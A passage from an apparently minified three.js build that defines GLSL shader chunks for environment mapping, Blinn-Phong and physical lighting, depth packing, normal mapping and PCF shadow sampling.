<normal_flip>\\n\\t\\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( queryVec, 1.0 );\\n\\t\\t#else\\n\\t\\t\\tvec4 envMapColor = vec4( 0.0 );\\n\\t\\t#endif\\n\\t\\treturn PI * envMapColor.rgb * envMapIntensity;\\n\\t}\\n\\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\tfloat maxMIPLevelScalar = float( maxMIPLevel );\\n\\t\\tfloat desiredMIPLevel = maxMIPLevelScalar - 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\\n\\t\\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\\n\\t}\\n\\tvec3 getLightProbeIndirectRadiance( const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\\n\\t\\t#endif\\n\\t\\t#include <normal_flip>\\n\\t\\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\\n\\t\\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV(queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent));\\n\\t\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\t\\tvec2 sampleUV;\\n\\t\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#endif\\n\\t\\treturn envMapColor.rgb * envMapIntensity;\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.lights_phong_fragment=\"BlinnPhongMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb;\\nmaterial.specularColor = specular;\\nmaterial.specularShininess = shininess;\\nmaterial.specularStrength = specularStrength;\\n\";THREE.ShaderChunk.lights_phong_pars_fragment=\"varying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\nstruct BlinnPhongMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tvec3\\tspecularColor;\\n\\tfloat\\tspecularShininess;\\n\\tfloat\\tspecularStrength;\\n};\\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\\n}\\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_BlinnPhong\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_BlinnPhong\\n#define Material_LightProbeLOD( material )\\t(0)\\n\";\nTHREE.ShaderChunk.lights_physical_fragment=\"PhysicalMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\\n#ifdef STANDARD\\n\\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\\n#else\\n\\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\\n\\tmaterial.clearCoat = saturate( clearCoat );\\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\\n#endif\\n\";\nTHREE.ShaderChunk.lights_physical_pars_fragment=\"struct PhysicalMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tfloat\\tspecularRoughness;\\n\\tvec3\\tspecularColor;\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoat;\\n\\t\\tfloat clearCoatRoughness;\\n\\t#endif\\n};\\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectSpecular += radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_Physical\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_Physical\\n#define RE_IndirectSpecular\\t\\tRE_IndirectSpecular_Physical\\n#define Material_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.specularRoughness )\\n#define Material_ClearCoat_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\\n\\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\\n}\\n\";\nTHREE.ShaderChunk.lights_template=\"\\nGeometricContext geometry;\\ngeometry.position = - vViewPosition;\\ngeometry.normal = normal;\\ngeometry.viewDir = normalize( vViewPosition );\\nIncidentLight directLight;\\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if defined( RE_IndirectDiffuse )\\n\\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tlightMapIrradiance *= PI;\\n\\t\\t#endif\\n\\t\\tirradiance += lightMapIrradiance;\\n\\t#endif\\n\\t#if ( NUM_HEMI_LIGHTS > 0 )\\n\\t\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\t\\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t}\\n\\t#endif\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\\n\\t \\tirradiance += getLightProbeIndirectIrradiance( geometry, 8 );\\n\\t#endif\\n\\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\\n#endif\\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\\n\\tvec3 radiance = getLightProbeIndirectRadiance( geometry, Material_BlinnShininessExponent( material ), 8 );\\n\\t#ifndef STANDARD\\n\\t\\tvec3 clearCoatRadiance = getLightProbeIndirectRadiance( geometry, Material_ClearCoat_BlinnShininessExponent( material ), 8 );\\n\\t#else\\n\\t\\tvec3 clearCoatRadiance = vec3( 0.0 );\\n\\t#endif\\n\\t\\t\\n\\tRE_IndirectSpecular( radiance, clearCoatRadiance, geometry, material, reflectedLight );\\n#endif\\n\";\nTHREE.ShaderChunk.logdepthbuf_fragment=\"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)\\n\\tgl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;\\n#endif\";THREE.ShaderChunk.logdepthbuf_pars_fragment=\"#ifdef USE_LOGDEPTHBUF\\n\\tuniform float logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n#endif\\n\";THREE.ShaderChunk.logdepthbuf_pars_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n\\tuniform float logDepthBufFC;\\n#endif\";\nTHREE.ShaderChunk.logdepthbuf_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\tgl_Position.z = log2(max( EPSILON, gl_Position.w + 1.0 )) * logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvFragDepth = 1.0 + gl_Position.w;\\n\\t#else\\n\\t\\tgl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;\\n\\t#endif\\n#endif\\n\";THREE.ShaderChunk.map_fragment=\"#ifdef USE_MAP\\n\\tvec4 texelColor = texture2D( map, vUv );\\n\\ttexelColor = mapTexelToLinear( texelColor );\\n\\tdiffuseColor *= texelColor;\\n#endif\\n\";\nTHREE.ShaderChunk.map_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform sampler2D map;\\n#endif\\n\";THREE.ShaderChunk.map_particle_fragment=\"#ifdef USE_MAP\\n\\tvec4 mapTexel = texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) * offsetRepeat.zw + offsetRepeat.xy );\\n\\tdiffuseColor *= mapTexelToLinear( mapTexel );\\n#endif\\n\";THREE.ShaderChunk.map_particle_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform vec4 offsetRepeat;\\n\\tuniform sampler2D map;\\n#endif\\n\";THREE.ShaderChunk.metalnessmap_fragment=\"float metalnessFactor = metalness;\\n#ifdef USE_METALNESSMAP\\n\\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\\n\\tmetalnessFactor *= texelMetalness.r;\\n#endif\\n\";\nTHREE.ShaderChunk.metalnessmap_pars_fragment=\"#ifdef USE_METALNESSMAP\\n\\tuniform sampler2D metalnessMap;\\n#endif\";THREE.ShaderChunk.morphnormal_vertex=\"#ifdef USE_MORPHNORMALS\\n\\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\\n\\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\\n\\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\\n\\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\\n#endif\\n\";\nTHREE.ShaderChunk.morphtarget_pars_vertex=\"#ifdef USE_MORPHTARGETS\\n\\t#ifndef USE_MORPHNORMALS\\n\\tuniform float morphTargetInfluences[ 8 ];\\n\\t#else\\n\\tuniform float morphTargetInfluences[ 4 ];\\n\\t#endif\\n#endif\";THREE.ShaderChunk.morphtarget_vertex=\"#ifdef USE_MORPHTARGETS\\n\\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\\n\\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\\n\\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\\n\\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\\n\\t#ifndef USE_MORPHNORMALS\\n\\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\\n\\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\\n\\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\\n\\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.normal_flip=\"#ifdef DOUBLE_SIDED\\n\\tfloat flipNormal = ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n#else\\n\\tfloat flipNormal = 1.0;\\n#endif\\n\";THREE.ShaderChunk.normal_fragment=\"#ifdef FLAT_SHADED\\n\\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\\n\\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\\n\\tvec3 normal = normalize( cross( fdx, fdy ) );\\n#else\\n\\tvec3 normal = normalize( vNormal ) * flipNormal;\\n#endif\\n#ifdef USE_NORMALMAP\\n\\tnormal = perturbNormal2Arb( -vViewPosition, normal );\\n#elif defined( USE_BUMPMAP )\\n\\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\\n#endif\\n\";\nTHREE.ShaderChunk.normalmap_pars_fragment=\"#ifdef USE_NORMALMAP\\n\\tuniform sampler2D normalMap;\\n\\tuniform vec2 normalScale;\\n\\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\\n\\t\\tvec3 q0 = dFdx( eye_pos.xyz );\\n\\t\\tvec3 q1 = dFdy( eye_pos.xyz );\\n\\t\\tvec2 st0 = dFdx( vUv.st );\\n\\t\\tvec2 st1 = dFdy( vUv.st );\\n\\t\\tvec3 S = normalize( q0 * st1.t - q1 * st0.t );\\n\\t\\tvec3 T = normalize( -q0 * st1.s + q1 * st0.s );\\n\\t\\tvec3 N = normalize( surf_norm );\\n\\t\\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\tmapN.xy = normalScale * mapN.xy;\\n\\t\\tmat3 tsn = mat3( S, T, N );\\n\\t\\treturn normalize( tsn * mapN );\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.packing=\"vec3 packNormalToRGB( const in vec3 normal ) {\\n  return normalize( normal ) * 0.5 + 0.5;\\n}\\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\\n  return 1.0 - 2.0 * rgb.xyz;\\n}\\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\\nconst float ShiftRight8 = 1. / 256.;\\nvec4 packDepthToRGBA( const in float v ) {\\n\\tvec4 r = vec4( fract( v * PackFactors ), v );\\n\\tr.yzw -= r.xyz * ShiftRight8;\\treturn r * PackUpscale;\\n}\\nfloat unpackRGBAToDepth( const in vec4 v ) {\\n\\treturn dot( v, UnpackFactors );\\n}\\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\\n  return ( viewZ + near ) / ( near - far );\\n}\\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\\n  return linearClipZ * ( near - far ) - near;\\n}\\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\\n  return (( near + viewZ ) * far ) / (( far - near ) * viewZ );\\n}\\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\\n  return ( near * far ) / ( ( far - near ) * invClipZ - far );\\n}\\n\";\nTHREE.ShaderChunk.premultiplied_alpha_fragment=\"#ifdef PREMULTIPLIED_ALPHA\\n\\tgl_FragColor.rgb *= gl_FragColor.a;\\n#endif\\n\";THREE.ShaderChunk.project_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 mvPosition = modelViewMatrix * skinned;\\n#else\\n\\tvec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\\n#endif\\ngl_Position = projectionMatrix * mvPosition;\\n\";THREE.ShaderChunk.roughnessmap_fragment=\"float roughnessFactor = roughness;\\n#ifdef USE_ROUGHNESSMAP\\n\\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\\n\\troughnessFactor *= texelRoughness.r;\\n#endif\\n\";\nTHREE.ShaderChunk.roughnessmap_pars_fragment=\"#ifdef USE_ROUGHNESSMAP\\n\\tuniform sampler2D roughnessMap;\\n#endif\";THREE.ShaderChunk.shadowmap_pars_fragment=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n\\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\\n\\t\\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\\n\\t}\\n\\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\\n\\t\\tconst vec2 offset = vec2( 0.0, 1.0 );\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / size;\\n\\t\\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\\n\\t\\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\\n\\t\\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\\n\\t\\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\\n\\t\\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\\n\\t\\tvec2 f = fract( uv * size + 0.5 );\\n\\t\\tfloat a = mix( lb, lt, f.y );\\n\\t\\tfloat b = mix( rb, rt, f.y );\\n\\t\\tfloat c = mix( a, b, f.x );\\n\\t\\treturn c;\\n\\t}\\n\\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tshadowCoord.xyz /= shadowCoord.w;\\n\\t\\tshadowCoord.z += shadowBias;\\n\\t\\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\\n\\t\\tbool inFrustum = all( inFrustumVec );\\n\\t\\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\\n\\t\\tbool frustumTest = all( frustumTestVec );\\n\\t\\tif ( frustumTest ) {\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\\n\\t\\t#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n\\t}\\n\\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\\n\\t\\tvec3 absV = abs( v );\\n\\t\\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\\n\\t\\tabsV *= scaleToCube;\\n\\t\\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\\n\\t\\tvec2 planar = v.xy;\\n\\t\\tfloat almostATexel = 1.5 * texelSizeY;\\n\\t\\tfloat almostOne = 1.0 - almostATexel;\\n\\t\\tif ( absV.z >= almostOne ) {\\n\\t\\t\\tif ( v.z > 0.0 )\\n\\t\\t\\t\\tplanar.x = 4.0 - v.x;\\n\\t\\t} else if ( absV.x >= almostOne ) {\\n\\t\\t\\tfloat signX = sign( v.x );\\n\\t\\t\\tplanar.x = v.z * signX + 2.0 * signX;\\n\\t\\t} else if ( absV.y >= almostOne ) {\\n\\t\\t\\tfloat signY = sign( v.y );\\n\\t\\t\\tplanar.x = v.x + 2.0 * signY + 2.0;\\n\\t\\t\\tplanar.y = v.z * signY - 2.0;\\n\\t\\t}\\n\\t\\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\\n\\t}\\n\\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tvec2 texelSize = 